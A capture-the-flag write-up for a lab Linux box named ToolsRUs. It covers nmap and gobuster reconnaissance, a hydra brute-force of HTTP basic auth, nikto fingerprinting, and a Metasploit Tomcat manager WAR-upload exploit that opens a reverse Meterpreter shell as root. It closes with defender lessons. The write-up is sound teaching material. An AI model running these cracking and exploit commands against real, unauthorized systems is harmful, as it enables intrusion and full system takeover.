// Overview

ToolsRUs is a beginner-friendly Linux box that walks the classic kill chain end to end: directory brute-forcing, HTTP basic-auth cracking, service fingerprinting, and then a well-known Tomcat manager exploit to land a shell. It's built for people who've used the tools a little and want to chain them together in anger. The real story here isn't the exploit, it's that Tomcat was running as root, which turns a low-privilege web compromise straight into a full system takeover.

// Reconnaissance

Port and Service Discovery

A full TCP sweep with version detection surfaces four services. Nothing exotic, but note the second HTTP service on 1234, that's the interesting one.

$ nmap -p- -sV <target_ip>

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
1234/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)

Directory Enumeration

A wordlist run against port 80 turns up two useful paths. /guidelines redirects (301) and /protected returns 401, basic auth.

$ gobuster dir -u http://<target_ip> -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt

/guidelines   (Status: 301) [--> http://<target_ip>/guidelines/]
/protected    (Status: 401)

Browsing /guidelines/ turns up a note in the page content that does two jobs at once: it names the user, and it name-drops the service we'll be attacking next:

Hey bob, did you update that TomCat server?

That's bob for Q2, and a pointer to the second web service on port 1234. The protected directory, it turns out, belongs to him.

// Cracking Basic Auth

HTTP basic auth is just a base64-encoded user:pass in the Authorization header, so it's a straightforward online brute-force target. Hydra's http-get module handles the 401 challenge/response cycle for us:

$ hydra -l bob -P /usr/share/wordlists/rockyou.txt <target_ip> http-get /protected

[80][http-get] host: <target_ip>   login: bob   password: [redacted]

Weak password, small wordlist, done in ~20 seconds. The lesson: basic auth with a dictionary password is essentially unauthenticated.

// Fingerprinting Tomcat

Port 1234 is a Tomcat manager interface. Nikto, given the credentials we just found, confirms it and reports its findings, including the Server header, which answers the version questions directly:

$ nikto -h http://<target_ip>:1234/manager/html -id bob:<password>

+ Server: Apache-Coyote/1.1
+ Successfully authenticated to realm 'Tomcat Manager Application' with user-supplied credentials.
+ Allowed HTTP Methods: GET, HEAD, POST, PUT, DELETE, OPTIONS
+ /manager/html/manager/html: Default Tomcat Manager interface found
+ /manager/html/WorkArea/version.xml: Ektron CMS version information

Server: Apache-Coyote/1.1, i.e. Tomcat's Coyote JSP engine, version 1.1. The exposed manager interface plus working credentials is the whole attack surface: the manager can deploy WAR files, and a deployed WAR gives remote code execution.

A note on the room's questions: one of the prompts in this room is truncated on the THM side ("How many docume0…"). The accepted answer doesn't cleanly map to anything in current Nikto output, it looks like a legacy artefact from an older Nikto version. I brute-forced it manually and moved on. Worth flagging rather than pretending it made sense.

// Exploitation: Tomcat Manager → Shell

Metasploit ships a module that does exactly this: authenticate to the manager, deploy a malicious WAR, trigger it, then clean up (undeploy) behind itself. All we supply is the target, port, and the credentials we recovered.

$ msfconsole
msf6 > use exploit/multi/http/tomcat_mgr_upload
msf6 exploit(multi/http/tomcat_mgr_upload) > set RHOSTS <target_ip>
msf6 exploit(multi/http/tomcat_mgr_upload) > set RPORT 1234
msf6 exploit(multi/http/tomcat_mgr_upload) > set HttpUsername bob
msf6 exploit(multi/http/tomcat_mgr_upload) > set HttpPassword <password>
msf6 exploit(multi/http/tomcat_mgr_upload) > set LHOST <tun0_ip>
msf6 exploit(multi/http/tomcat_mgr_upload) > set LPORT 4444
msf6 exploit(multi/http/tomcat_mgr_upload) > run

Output, trimmed:

[*] Retrieving session ID and CSRF token...
[*] Uploading and deploying ...
[*] Executing ...
[*] Undeploying ...
[*] Meterpreter session 1 opened (... -> ...)
Why this works: the Tomcat manager is an administrative deploy endpoint. Anyone who can authenticate to it can upload a WAR, and a WAR is just a JSP payload with a servlet wrapper. No memory corruption, no weird gadget chain, the feature is the vulnerability. This is why exposing the manager interface to the internet is a classic real-world finding.

// Finding the Flag (and Why No Privesc)

Dropping to a shell and asking who we are is the fastest way to find out how badly the service was configured:

meterpreter > shell
$ whoami
root

That's the punchline. Tomcat was started as root, so the web-facing RCE is a root RCE. No privilege escalation required, we're already at the top of the tree. The flag lives in /root:

$ ls /root
flag.txt  snap

$ cat /root/flag.txt
[redacted]

Shell, flag, done. But that's the least interesting part of the box.

What a Defender Takes From This

Three misconfigurations stack up to make this box trivially rootable, and all three are common in the wild:

  • Tomcat running as root. A web service should run as a dedicated low-privilege user. Had it, the exploit would have landed a shell as tomcat and the box would have required real privesc.
  • Basic auth over plain HTTP. Credentials travel base64-encoded, which is encoding, not encryption. A weak password plus a dictionary makes the crack near-instant.
  • Manager interface exposed on a non-standard port. Moving Tomcat to 1234 doesn't hide it; it just means a full port scan finds it instead of a top-1000 one. Security by obscurity isn't.

// Verdict

ToolsRUs is a solid first "chain everything together" box. Individually each step is easy, but the value is in doing them in sequence and reading each output to decide the next move. The Q8 truncation is an annoyance, and the fact that no privesc is needed makes the ending feel a little anticlimactic. That said, the "Tomcat as root" misconfiguration is a genuinely good teaching moment: it's the kind of thing you'll flag in a real pentest report, and it's more interesting than the shell itself.

→ 6/10 — a good methodology drill; the defensive lesson outshines the exploit.
